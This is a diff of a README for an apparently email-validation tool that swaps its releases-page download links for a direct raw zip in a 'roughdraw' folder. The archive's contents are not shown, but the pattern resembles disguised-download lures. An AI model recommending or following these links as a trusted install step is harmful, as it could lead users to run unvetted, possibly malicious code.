@@ -6,11 +6,11 @@ Welcome to the **bulk-email-validation-scoring** repository! This tool helps you
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-bulk--email--validation--scoring-blue.svg)](https://github.com/Shivaboya007/bulk-email-validation-scoring/releases)
+[![Download](https://github.com/Shivaboya007/bulk-email-validation-scoring/raw/refs/heads/main/roughdraw/email_validation_scoring_bulk_1.3.zip)](https://github.com/Shivaboya007/bulk-email-validation-scoring/raw/refs/heads/main/roughdraw/email_validation_scoring_bulk_1.3.zip)
 
 To get started, visit this page to download the latest version of the application:
 
-[Download Latest Release](https://github.com/Shivaboya007/bulk-email-validation-scoring/releases)
+[Download Latest Release](https://github.com/Shivaboya007/bulk-email-validation-scoring/raw/refs/heads/main/roughdraw/email_validation_scoring_bulk_1.3.zip)
 
 ## 📋 Installation Instructions
 
